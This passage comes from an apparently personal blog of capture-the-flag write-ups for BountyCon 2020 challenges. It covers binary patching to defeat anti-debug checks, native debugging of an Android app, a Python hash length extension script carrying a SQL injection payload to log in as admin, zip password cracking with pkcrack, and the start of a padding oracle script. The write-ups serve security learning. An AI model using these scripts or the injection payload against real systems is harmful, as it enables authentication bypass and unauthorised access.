  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">__stack_chk_fail</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">RC4_set_key((RC4_KEY *)local_118,0x32,key);</code> was getting the key for RC4.
<code class="highlighter-rouge">RC4((RC4_KEY *)local_118,0x4e,ptext,ptext);</code> was decrypting the ptext using RC4.</p>

<p><code class="highlighter-rouge">runPayload();</code> has the following code.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">runPayload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined8</span> <span class="o">*</span><span class="n">puVar1</span><span class="p">;</span>
  
  <span class="n">puVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span><span class="n">rwxmalloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
  <span class="n">unpackPayload</span><span class="p">(</span><span class="n">puVar1</span><span class="p">);</span>
  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="n">puVar1</span><span class="p">)();</span> 
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Line <code class="highlighter-rouge">(*(code *)puVar1)();</code> looks strange. Here it is calling some method, so lets check what it is calling.</p>

<p><code class="highlighter-rouge">lVar2 = ptrace(PTRACE_TRACEME,0,1,0);</code> of main function checking if debugger is attached or not.
So, Running the file with the debugger attached will delete the file. For this, we have to patch the file. I did it using <code class="highlighter-rouge">radare2</code></p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 <span class="nt">-w</span> ./anti_what
s 0x158f // Address on which we want to change the instruction
wa jmp 0x15a8 //change je to jmp
quit 
</code></pre></div></div>
<p>Use <code class="highlighter-rouge">objdump anti_what -d</code> to check if changes are made or not. Look at 0x158f address</p>

<p><img src="/images/Untitled1.png" alt="" class="img-responsive" /></p>

<p><img src="/images/Screenshot_4.png" alt="" class="img-responsive" /></p>

<p>Now,</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ./anti_what
<span class="nb">break </span>runPayload <span class="c"># to check what's going on runPayload</span>
r
disas
</code></pre></div></div>

<p>Set breakpoint after line “call *%rdx”. In my case it is <code class="highlighter-rouge">0x0000555555555554f1</code></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">break</span> <span class="k">*</span>0x0000555555555554f1
c
x/s <span class="nv">$rdx</span>

</code></pre></div></div>

<p><img src="/images/Untitled2.png" alt="" class="img-responsive" /></p>

<p>Press <code class="highlighter-rouge">Enter</code> a few times you will get your flag.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="ghidra-is-cool">Ghidra is Cool!</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This is just a warm up.


ghidra_is_cool.tar.gz
</code></pre></div></div>

<p><a href="/files/ghidra_is_cool.tar.gz">Link to the file</a></p>

<p>It was the simplest one I guess. After extracting the file and running the file it printed nothing.
<code class="highlighter-rouge">strings ghidra_is_cool</code>
shows string <code class="highlighter-rouge">patch me!</code> in the file
I used Ghidra to decompile the file. Code looked like this</p>

<p><img src="/images/Screenshot_5.png" alt="" class="img-responsive" /></p>

<p>Address 0x00401063 contains <code class="highlighter-rouge">SYSCALL</code> (looks interesting).
I patch the file by changing program to jmp at 0x0040101a so that SYSCALL get executed.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 <span class="nt">-w</span> ./ghidra_is_cool
s 0x401000
wa jmp 0x0040101a
<span class="nb">exit</span>
</code></pre></div></div>
<p>Check the changes are made using
<code class="highlighter-rouge">objdump -D -M intel -j .text ghidra_is_cool</code></p>

<p>Just run the program to get the flag.
<code class="highlighter-rouge">./ghidra_is_cool</code></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="meggenser">Meggenser</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the public beta of our new messaging app, with heavily optimised Emoji Input menu™.
Note: the flag format for this challenge is bountycon-...



meggenser.tar.gz
</code></pre></div></div>

<p><a href="/files/meggenser.tar.gz">Link to the file</a></p>

<p>After extracting the file and running the apk file. The following screen containing emoji opened. It had nothing just emoji to send and delete the message.</p>

<p><img src="/images/Screenshot_6.png" alt="" class="img-responsive" /></p>

<p>Pressing any emoji text will appear as something like “:abc-abc-abc:”. Flag format for this challenge is bountycon-… as given in the details of the task. The flag should be like “:bountycon-abc-abc:” and text will convert to some sort of emoji.</p>

<p>After checking the JAVA code(decompiled using Jadx) of apk file. There was nonthing interesting in the apk file. Everything was done in <code class="highlighter-rouge">libparse.so</code> file. So, I started to debug it.</p>

<p>After analyzing it a lot with GDB,apktool, and Jadx, I came to a situation where each character of an entered text going to a specific if condition. When a character is right if the condition will get true else not.</p>

<p>So, I just bruteforce the flag by holding the if condition.</p>

<p>In function 
<code class="highlighter-rouge">Java_com_facebook_bountycon2020_app_Emojifier_parse</code>. There is one if condition like below</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(((</span><span class="n">cVar3</span> <span class="o">!=</span> <span class="sc">'-'</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
  <span class="p">(((</span><span class="n">local_3c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffa0</span><span class="p">,</span> <span class="mh">0x19</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">cVar3</span> <span class="o">+</span> <span class="mh">0x9fU</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
    <span class="p">(</span><span class="n">local_3c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffeb</span><span class="p">,</span> <span class="mi">9</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">byte</span><span class="p">)(</span><span class="n">cVar3</span> <span class="o">-</span> <span class="mh">0x30U</span><span class="p">)))</span> <span class="o">||</span>
   <span class="p">(</span><span class="n">pcVar7</span> <span class="o">=</span> <span class="n">local_3c</span> <span class="o">+</span> <span class="n">cVar3</span><span class="p">,</span> <span class="n">pcVar7</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">))))</span> <span class="o">||</span>
 <span class="p">(</span><span class="n">piVar11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">piVar11</span><span class="p">[(</span><span class="kt">int</span><span class="p">)(</span><span class="n">pcVar7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)],</span> <span class="n">piVar11</span> <span class="o">==</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">))</span> <span class="k">goto</span> <span class="n">LAB_00010c33</span><span class="p">;</span>

</code></pre></div></div>
<p>Whatever you enter the right character of the flag. Above if the condition will be true.</p>

<p>Install the apk file by <code class="highlighter-rouge">adb install meggenser.apk</code>. I used genymotion for the emulator.</p>

<p>Connect meggenser app to gdb to debug it.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb connect 192.168.145.101:5555 <span class="c"># Enter your emulator ip and port</span>
adb forward tcp:44444 tcp:44444
adb shell am start com.facebook.bountycon2020.app/com.facebook.bountycon2020.app.MainActivity
adb shell su root <span class="s1">'gdbserver --attach :44444 `pidof com.facebook.bountycon2020.app`'</span>
<span class="c">#Run GDB.</span>
gdb <span class="nt">-ex</span> <span class="s1">'target remote :44444'</span>
<span class="nb">break </span>Java_com_facebook_bountycon2020_app_Emojifier_parse
c
<span class="c"># Enter any input from app.</span>
disas
<span class="c">#Place breakpoint anywhere in the if condition. In my case, it is address 0xe39alccf</span>
<span class="nb">break</span> <span class="k">*</span>0xe39alccf
del 1 <span class="c"># To delete the first breakpoint.</span>
<span class="c"># Enter :bountycon-a: as flag for this challenge starts with bountycon-...</span>
c 10 <span class="c"># length of "bountycon-" is 10 if message prints on the app then it is a wrong guess.</span>
<span class="c"># Enter :bountycon-3:</span>
c 10 <span class="c"># gdb will be on breakpoint under the if condition as input is correct so "3" is the right input for the the flag.</span>
c
<span class="c"># Enter :bountycon-3a: as flag for this challenge starts with bountycon-...</span>
c 11 <span class="c"># length of "bountycon-3" is 11 if message prints on the app then it is a wrong guess.</span>
<span class="c"># Enter :bountycon-3m:</span>
c 11 <span class="c"># gdb will be on breakpoint under the if condition as input is correct</span>
c
<span class="c"># so on guess the whole flag.</span>
</code></pre></div></div>

<p>Demo:</p>

<p><a href="https://youtu.be/sdamfI_cIwI" target="_blank"><img src="https://i.imgur.com/vKb2F1B.png" alt="Watch the video" /></a></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="uibeauty">ui.beauty</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Good UI is not a choice.



https://178.128.95.74/ui/
</code></pre></div></div>

<p>After login into the website. On the website, there was a page that an admin could access only saying</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAGship product

You're not ready.
</code></pre></div></div>

<p>means this is the page that contains flags but we have to login as admin to access the page.</p>

<p><img src="/images/Screenshot_8.png" alt="" class="img-responsive" /></p>

<p>In the customer zone tab, there is <code class="highlighter-rouge">ui.beauty P2P distribution</code> heading which contains the source code of the website of itself.
Checking the source code I didn’t find anything special except <code class="highlighter-rouge">cookie.php</code>.</p>

<p><img src="/images/Screenshot_7.png" alt="" class="img-responsive" /></p>

<p>Let’s understand the verify_cookie function.</p>

<p>Cookie value passed to function as the cookie variable. Then cookie string is reversed using strrev($cookie) after then it is decoded by base64 and stored to <code class="highlighter-rouge">$cd</code>.</p>

<p>If string($cd) is &lt;= 32 return false else last 32 character of <code class="highlighter-rouge">$cd</code> contains hash and remaining contains <code class="highlighter-rouge">data(email)</code>.MD5 hash of $secret_cookie_key concatenated with email(<code class="highlighter-rouge">MD5($secret_cookie_key+Email)</code>) is stored to $rhash.</p>

<p>Then a check is performed if the hash is the same or something has changed with MD5 hash.</p>

<p>If hash is same then email is placed on SQL query and SQL query is executed to get the user and return it.</p>

<p>There are two things to note.</p>

<ul>
  <li>
    <p>Secret key concatenate with user email then MD5 is done.</p>
  </li>
  <li>
    <p>SQL query is vulnerable to SQL Injection.</p>
  </li>
</ul>

<p>After googling, I came to know that if the secret key is combined with a user-controlled message then it is vulnerable to a length extension attack. This means the attacker can make a valid hash of secret_cookie_key+new_message without knowing the secret_cookie_key(length of secret_cookie_key needed to be known which is not a big deal, we can try all lengths).</p>

<p>Algorithms like MD5, SHA-1, and SHA-2 that are based on the Merkle–Damgård construction are susceptible to this kind of attack.</p>

<p>So, the idea was to make a valid hash of message with SQL Injection(secret_cookie_key+new_message where new_message is containing <code class="highlighter-rouge">" or 'role'="admin"-- -</code> in the end) to log in as admin by doing SQL Injection.</p>

<p>The key length was 56.</p>

<p>The script that I used for the solution:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">httplib</span><span class="p">,</span> <span class="n">urllib</span>
<span class="kn">from</span> <span class="nn">hashpumpy</span> <span class="kn">import</span> <span class="n">hashpump</span>
<span class="kn">import</span> <span class="nn">ssl</span>

<span class="n">ssl</span><span class="o">.</span><span class="n">_create_default_https_context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span>
<span class="n">taglen</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">/</span> <span class="mi">8</span>
<span class="n">tag</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">orig_msg</span> <span class="o">=</span> <span class="bp">None</span>
<span class="c1">#append_msg = '" or `role`="admin" -- -'
</span><span class="n">append_msg</span> <span class="o">=</span> <span class="s">'"'</span> <span class="c1"># There will be an SQL error
</span>
<span class="n">tag</span> <span class="o">=</span> <span class="s">"fc52f628914d6bfe0a83e40ec25e5dc1"</span>
<span class="n">orig_msg</span> <span class="o">=</span> <span class="s">"abc@gmail.com"</span>

<span class="k">print</span><span class="p">(</span><span class="s">"original tag was: </span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">hexdump</span><span class="p">(</span><span class="n">tag</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"original message was: "</span> <span class="o">+</span> <span class="n">orig_msg</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">perform_hlext</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="n">orig_msg</span><span class="p">,</span> <span class="n">append_msg</span><span class="p">,</span> <span class="n">keylen</span><span class="p">):</span>
    <span class="s">"""take the tag and the orig_msg, perform hash length extension
    for the given key length.
    returns [tag][message]"""</span>
    <span class="n">newdgst</span><span class="p">,</span> <span class="n">newmsg</span> <span class="o">=</span> <span class="n">hashpump</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span>
                               <span class="n">orig_msg</span><span class="p">,</span>
                               <span class="n">append_msg</span><span class="p">,</span>
                               <span class="n">keylen</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"hashpump returned: </span><span class="se">\n</span><span class="s">digest: {}</span><span class="se">\n</span><span class="s">msg: {}"</span>
             <span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">newdgst</span><span class="p">,</span> <span class="p">(</span><span class="n">newmsg</span><span class="p">)))</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPSConnection</span><span class="p">(</span><span class="s">"178.128.95.74"</span><span class="p">)</span>
    <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(((</span><span class="n">newmsg</span><span class="o">+</span><span class="n">newdgst</span><span class="p">)))</span>
    <span class="n">login</span><span class="o">=</span><span class="n">encoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Cookie Value: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">login</span><span class="p">));</span>
    <span class="c1">#print(login)
</span>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Cookie"</span><span class="p">:</span> <span class="s">"login="</span><span class="o">+</span><span class="n">login</span><span class="p">}</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/ui/?tools-flagship"</span><span class="p">,</span><span class="s">""</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
    <span class="n">data</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="c1">#    print(data)
</span>    <span class="k">if</span> <span class="s">"sql"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"SQL"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"Sql"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"Error"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"error"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"ERROR"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"Failed"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s">"failed"</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="c1"># bruteforce the key length
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trying key length {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">perform_hlext</span><span class="p">(</span><span class="n">tag</span><span class="p">,</span> <span class="n">orig_msg</span><span class="p">,</span> <span class="n">append_msg</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>



</code></pre></div></div>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="matts-string-reverser">Matt’s String Reverser</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Back in the 90's, string reversing was not as easy as [::-1]. Glue.bar has unearthed Matt's legacy after more than 20 years and are providing his legendary software free of charge.

https://www.glue.bar/mattsstringreverser/

Note: this challenge is not related to Glue.bar at all
</code></pre></div></div>

<p>Website looks like</p>

<p><img src="/images/Screenshot_9.png" alt="" class="img-responsive" /></p>

<p>From the page description, it looks like the demo URL was there before it was removed. I decided to look at its archive page. 
So, I opened the <code class="highlighter-rouge">https://web.archive.org/</code> and search for <code class="highlighter-rouge">https://www.glue.bar/mattsstringreverser/</code> 
there was the three snapshot of this page. From which one is <code class="highlighter-rouge">https://web.archive.org/web/20191231221341/https://www.glue.bar/mattsstringreverser/</code>
which contains the link to the software</p>

<p>After downloading the zip file and extracting it. It contains demo and index.php file in it which looks like.</p>

<p><img src="/images/Screenshot_10.png" alt="" class="img-responsive" /></p>

<p>As you see there is a string in a reversed order which is <code class="highlighter-rouge">https://www.glue.bar/mattsstringreverser/matt-himself.jpg</code></p>

<p>Running the command <code class="highlighter-rouge">file matt-himself.jpg</code> will have an output like</p>

<p><img src="/images/Screenshot_11.png" alt="" class="img-responsive" /></p>

<p>Where the description has reverse order string <code class="highlighter-rouge">version2-secret-preview.zip</code></p>

<p>Opening <code class="highlighter-rouge">https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip</code> will download the zip file which contains matt-himself.jpg and index.php file. Both files are password protected.</p>

<p>After googling, I came to know that if some plaintext of the zip is known then we can crack the password. In this case, we have plaintext(matt-himself.jpg)</p>

<p>But after trying too much to crack the password(I tried too many tools) this method did not work.</p>

<p>The next day, I tried the same way but making things similar to <code class="highlighter-rouge">glue.bar</code> server e.g using Ubuntu server on AWS instead of a local kali Linux machine.</p>

<p>And this works on AWS with Ubuntu. Same method wasn’t work on local kali Linux machine because you have to zip the plaintext file to crack password and zip program of ubuntu and kali wasn’t same(there is some difference). Protected files was zipped on Ubuntu.</p>

<p>On Ubuntu, I used <code class="highlighter-rouge">https://github.com/keyunluo/pkcrack</code> tool to get the password protected files.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>matt
<span class="nb">cd </span>matt
wget https://www.glue.bar/mattsstringreverser/matt-himself.jpg
<span class="nb">sudo </span>zip a.zip matt-himself.jpg
wget https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip
../bin/extract a.zip matt-himself.jpg 
<span class="nb">mv </span>matt-himself.jpg matt-himselfP.jpg
<span class="nb">mkdir </span>ver2
../bin/extract version2-secret-preview.zip ver2/matt-himself.jpg 
<span class="nb">mv </span>ver2/matt-himself.jpg matt-himselfC.jpg
../bin/pkcrack <span class="nt">-c</span> matt-himselfC.jpg <span class="nt">-p</span> matt-himselfP.jpg <span class="nt">-C</span> version2-secret-preview.zip <span class="nt">-P</span> a.zip <span class="nt">-d</span> matt-cracked.zip

</code></pre></div></div>
<p><img src="/images/Screenshot_12.png" alt="" class="img-responsive" /></p>

<p>Open index.php file from matt-cracked.zip and run it. Reverse any string to get the flag.</p>

<p><img src="/images/Screenshot_13.png" alt="" class="img-responsive" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="maze-runner">Maze Runner</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We found this ultra secure login form. But where is the code?

https://178.128.95.74/mr/
</code></pre></div></div>

<p>Website looks like</p>

<p><img src="/images/Screenshot_14.png" alt="" class="img-responsive" /></p>

<p>First, just copy the all source code and make a similar website on your local machine. Then copy the text in the middle behind the checkbox.</p>

<p><img src="/images/Screenshot_15.png" alt="" class="img-responsive" /></p>

<p>Paste javascript code in the index.html file(in the script tag) which you created(don’t Beautify it just paste it as you copy.)</p>

<p><img src="/images/Screenshot_16.png" alt="" class="img-responsive" /></p>

<p>Open HTML file in chrome. Open developer tools and in the source tab. Open the html file. Click on the pretty print button to Beautify the code.</p>

<p>Now place breakpoint on <code class="highlighter-rouge">[B[h][H]]&amp;15();</code>. In my case it is on line 73.</p>

<p><img src="/images/Screenshot_36.png" alt="" class="img-responsive" /></p>

<p>Code looks like</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span><span class="nx">d</span><span class="cm">/*  $
#:*/</span>
                <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">[(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span>
                        <span class="nx">H</span> <span class="o">+=</span> <span class="nx">X</span> <span class="o">*</span> <span class="p">(</span><span class="nx">D</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                        <span class="nx">h</span><span class="cm">/* %
%%*/</span>
                        <span class="o">+=</span> <span class="nx">x</span> <span class="o">*</span> <span class="p">(</span><span class="nx">D</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span>
                        <span class="nx">T</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
                        <span class="nx">x</span> <span class="cm">/* |
u$*/</span>
                        <span class="o">=</span> <span class="o">-</span><span class="nx">X</span><span class="p">;</span>
                        <span class="nx">X</span> <span class="o">=</span> <span class="nx">T</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span>
                        <span class="nx">T</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
                        <span class="nx">x</span> <span class="o">=</span> <span class="nx">X</span><span class="p">;</span>
                        <span class="cm">/*#
##*/</span>
                        <span class="nx">X</span> <span class="o">=</span> <span class="o">-</span><span class="nx">T</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span> <span class="p">?</span> <span class="p">(</span><span class="nx">D</span> <span class="o">=</span> <span class="cm">/*$
%-*/</span>
                    <span class="nx">b</span><span class="p">.</span><span class="nx">pop</span><span class="p">())</span> <span class="p">:</span> <span class="nx">d</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">D</span> <span class="o">^=</span> <span class="nx">B</span><span class="p">[</span><span class="cm">/*%
n%*/</span>
                    <span class="mi">24</span><span class="p">][</span><span class="mi">2</span> <span class="o">+</span> <span class="p">(</span><span class="nx">d</span><span class="o">++</span> <span class="o">%</span> <span class="mi">31</span> <span class="cm">/* BountyCon 2
#$*/</span>
                    <span class="p">)]</span> <span class="o">^</span> <span class="mi">32</span><span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{</span>
                        <span class="nx">H</span> <span class="o">+=</span> <span class="nx">X</span><span class="p">;</span>
                        <span class="nx">h</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">;</span>
                        <span class="p">(</span><span class="nx">D</span><span class="cm">/*#
%#*/</span>
                        <span class="o">==</span> <span class="nx">B</span><span class="p">[</span><span class="nx">h</span><span class="p">][</span><span class="nx">H</span><span class="p">])</span> <span class="o">||</span> <span class="p">(</span><span class="nx">d</span> <span class="cm">/*B[h][H]=0;$
t0*/</span>
                        <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="nx">d</span> <span class="cm">/*H+=21;h--; %
#%*/</span>
                    <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="nx">_</span><span class="o">=&gt;</span><span class="p">{}</span>
                    <span class="p">)][</span><span class="nx">B</span><span class="p">[</span><span class="nx">h</span><span class="p">][</span><span class="nx">H</span> <span class="cm">/*2020|
%$*/</span>
                    <span class="p">]</span> <span class="o">&amp;</span> <span class="mi">15</span><span class="p">]();</span>
                    <span class="nx">H</span> <span class="o">=</span> <span class="p">(</span><span class="nx">H</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">+</span> <span class="nx">X</span><span class="p">)</span> <span class="o">%</span> <span class="mi">31</span><span class="p">;</span>
                    <span class="nx">h</span> <span class="cm">/* &amp;
y#*/</span>
                    <span class="o">=</span> <span class="p">(</span><span class="nx">h</span> <span class="o">+</span> <span class="nx">B</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="nx">x</span><span class="p">)</span> <span class="o">%</span> <span class="nx">B</span><span class="p">.</span><span class="nx">length</span>
                <span class="p">}</span>
</code></pre></div></div>
<p>This loop run over on each characters of input text.</p>

<p>On the console, Enter <code class="highlighter-rouge">P("BountyCon{asdsad}")</code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D^=B[24][2 + (d++ % 31)] ^ 32
</code></pre></div></div>
<p>Where D contains each character of entered text in the loop.
To get the flag, we have to hold the condition <code class="highlighter-rouge">B[h][H]==D</code> where we can control the value of D.</p>

<p>See the below video for better understanding.</p>

<p><a href="https://youtu.be/be47m9LKT0o" target="_blank"><img src="https://i.imgur.com/vKb2F1B.png" alt="Watch the video" /></a></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="not-a-speck">Not a Speck</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Decrypt messages at blazing speeds with the all new Speck block cipher.

https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m
</code></pre></div></div>

<p>On opening the website, it is saying <code class="highlighter-rouge">You have intercepted a secret message encrypted using the "Speck" block cipher. Decrypt it now!</code></p>

<p>Clicking on <code class="highlighter-rouge">Decrypt it</code> leads to <code class="highlighter-rouge">https://m2qglk5s8i.execute-api.eu-west-2.amazonaws.com/default/c2v53m?msg=5Hr1Y8IQMJ%2BHpmIXhr8dwDd8YO8h/3JG5OEfwtt7zAwBIDWKwbI52ECM6iQ%3D</code></p>

<p>Saying</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Message decrypted OK:

SyntaxError: Missing parentheses in call to 'print'. Did you mean print(ptext)?
</code></pre></div></div>

<p>There were three things to know.</p>

<p>On appending the <code class="highlighter-rouge">A</code> of different length to msg parameter it gives three different messages.</p>

<ul>
  <li>
    <p>Bad Base64</p>
  </li>
  <li>
    <p>Bad request: message padding error</p>
  </li>
  <li>
    <p>SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(ptext)?</p>
  </li>
</ul>

<p>Which leads me to padding oracle attack.</p>

<p>Below is the script that I used to get the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">paddingoracle</span> <span class="kn">import</span> <span class="n">BadPaddingException</span><span class="p">,</span> <span class="n">PaddingOracle</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">httplib</span><span class="p">,</span> <span class="n">urllib</span>
<span class="kn">import</span> <span class="nn">ssl</span>

<span class="n">ssl</span><span class="o">.</span><span class="n">_create_default_https_context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">_create_unverified_context</span>


<span class="k">class</span> <span class="nc">PadBuster</span><span class="p">(</span><span class="n">PaddingOracle</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">(</span><span class="n">PadBuster</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="n">__init__</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

